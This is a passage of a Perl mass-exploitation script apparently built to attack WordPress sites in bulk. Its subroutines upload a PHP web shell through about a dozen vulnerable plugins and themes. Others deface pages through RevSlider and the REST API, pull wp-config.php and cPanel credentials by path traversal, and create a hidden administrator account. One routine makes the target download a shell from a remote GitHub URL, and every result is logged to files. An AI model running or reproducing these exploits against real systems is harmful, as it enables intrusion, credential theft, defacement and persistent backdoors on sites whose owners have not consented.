my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Security not<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /Security/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold green'),"  SHELL => $revsliderajax\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

sub getconfig(){
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
     open(save, '>>Result/Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

sub getcpconfig(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["files/Izanami.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/Izanami.php?I=Xploit';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Showbiz";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $showbizup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Showbiz";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["files/Izanami.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/Izanami.php?I=Xploit";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $adsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/Izanami.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/Izanami.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/Izanami.php?I=Xploit";

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $sspup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/uploader.php";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/ZeroByte/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wpmdup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['files/Izanami.zip', => 'files/Izanami.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/Izanami/Izanami.php?I=Xploit";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wysijaup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/Izanami.php?I=Xploit";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/Izanami.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $inbomarketingup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/Izanami.php?I=Xploit";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["files/Izanami.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $dzsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/Izanami.php?I=Xploit";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/Izanami.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $reflexup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/Izanami.php?I=Xploit";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["files/Izanami.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $sexycontactup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold red'),"FAILED\n";
}
}
################ Realestate tema shell upload #####################
sub realestate(){ 
my $url = "$site/wp-content/themes/Realestate/Monetize/general/upload-file.php";
$realestateup = "$site/wp-content/themes/Realestate/images/Result/Izanami.php?I=Xploit";
my $field_name = "uploadfile[]";

my $realestateres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["files/Izanami.php"] ]
           
            );

$checkrealestateup = $ua->get("$realestateup")->content;
if($checkrealestateup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Realestate Tema Uplod";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $realestateup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$realestateup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Realestate Tema Uplod";
print color('bold white')," ............. ";
print color('bold red'),"FAILED\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Izanami.php?I=Xploit";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wtffup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold red'),"FAILED\n";
}
}

sub brainstorm(){

my $url = "$site/wp-content/themes/brainstorm/functions/jwpanel/scripts/uploadify/uploadify.php";
my $shell ="files/Izanami.php";
my $field_name = "Filedata";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

$fuildupz="$site/wp-content/uploads/2018/01/Izanami.php?I=Xploit";

my $checkblocktestimonial = $ua->get("$fuildupz")->content;
if($checkblocktestimonial =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"brainstorm";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $fuildupz\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$fuildupz\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"brainstorm";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="files/Izanami.php";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/Izanami.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold yellow')," [";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold green'),"Upload File Deface Succes\n";
print color('bold green'),"  URL => $jobmangerup\n";
print color('bold yellow'),"  [";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/Izanami.php?I=Xploit";

if ($response->content =~ /{"files/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $phpevup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendars(){
my $url = "$site/wp-admin/admin-ajax.php";


my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [filename => ["files/Izanami.php"], gcb_view => 'update', update_it => '1',  gcb_name => 'Foo', gcb_custom_id => '', gcb_type => 'php', gcb_description => '', gcbvalue => '$shell', gcb_updateshortcode => 'Update',]);
$phpevup="$site/wp-content/uploads/2018/02/Izanami.php?I=Xploit";

if ($response->content =~ /{"files/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"File Manager Plugin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $phpevup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"File Manager Plugin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="files/Izanami.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/Izanami.php?I=Xploit";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $Synopticup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ U-Design #####################
sub udesig(){
my $url = "$site/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php";
my $shell ="files/Izanami.php";
my $field_name = "Filedata";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$udesigup="$site/wp-content/themes/u-design/scripts/admin/uploadify/Izanami.php?I=Xploit";

$checkudesigup = $ua->get("$udesigup")->content;
if($checkudesigup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"U-design";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $udesigup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$udesigup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"U-design";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}
################ work-the-flow-file-upload #####################
sub workf(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$workfup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Izanami.php?I=Xploit";

$checkworkfup = $ua->get("$udesigup")->content;
if($checkworkfup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"workflow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $workfup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$workfup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"workflow";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="files/Izanami.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/Izanami.php?I=Xploit";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wp Shop";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $wpshopup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wp Shop";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
# this exploit Content Injection coded by fallag gassrini <3
################ Content Injection #####################
sub wpinjection(){
$linkposts = $site . '/index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/index/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='<p align="center"><img border="0" src="https://avatars0.githubusercontent.com/u/39859348?s=460&v=4" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">HaCkEd By Hiruka Minami</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'HaCkEd By Hiruka Minami ', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /HaCkEd/){
$urljson = "$site/m.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Injected Successfully\n";
print color('bold green'),"  SHELL => $urljson\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}
}

################ 0day admin  #####################
sub adad(){
$url = "$site/wp-admin/admin-ajax.php?action=ae-sync-user&method=create&user_login=Izanam&user_pass=xploit&user_email=sercany92%40gmail.com&role=administrator";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/success/g){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"0day admin adding";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold white'),"Injected Successfully\n";
print color('bold white'),"SHELL => [User]= izanami [Pass]= xploit Login : $site/wp-login.php\n";
     open(save, '>>Result/Add-Admon.txt');   
    print save "[adad] $url\n";   
    close(save);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"0day admin adding";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

###### WP LFD SCAN ######
######################
######################
######################
sub wplfd(){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"LFD and Config Backup";
print color('bold white')," ............. ";
print color('bold red'),"FiNDiNGG\n";
